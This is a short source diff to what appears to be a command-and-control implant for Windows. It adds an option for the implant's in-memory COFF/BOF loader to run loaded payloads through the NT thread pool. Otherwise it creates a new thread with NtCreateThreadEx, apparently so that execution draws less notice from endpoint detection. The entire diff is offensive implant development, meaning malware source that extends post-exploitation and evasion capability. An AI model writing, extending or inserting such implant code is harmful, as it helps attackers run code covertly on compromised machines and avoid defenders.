@@ -5,6 +5,7 @@
 #include <core/Package.h>
 #include <core/CoffeeLdr.h>
 #include <core/ObjectApi.h>
+#include <core/Jobs.h>
 #include <inject/InjectUtil.h>
 
 #if _WIN64
@@ -846,8 +847,19 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
 
     Instance->Threads++;
 
-    if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, NtCurrentProcess(), x64, CoffeeRunnerThread, CoffeeParams, NULL ) ) {
-        PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
-        PACKAGE_ERROR_WIN32
+    /* ARC-09: route through the NT thread pool when configured */
+    if ( Instance->Config.Implant.JobExecution == JOB_EXEC_THREADPOOL )
+    {
+        if ( ! JobSubmitThreadPool( CoffeeRunnerThread, CoffeeParams ) ) {
+            PRINTF( "Failed to submit CoffeeRunnerThread to thread pool: %d", NtGetLastError() )
+            PACKAGE_ERROR_WIN32
+        }
+    }
+    else
+    {
+        if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, NtCurrentProcess(), x64, CoffeeRunnerThread, CoffeeParams, NULL ) ) {
+            PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
+            PACKAGE_ERROR_WIN32
+        }
     }
 }
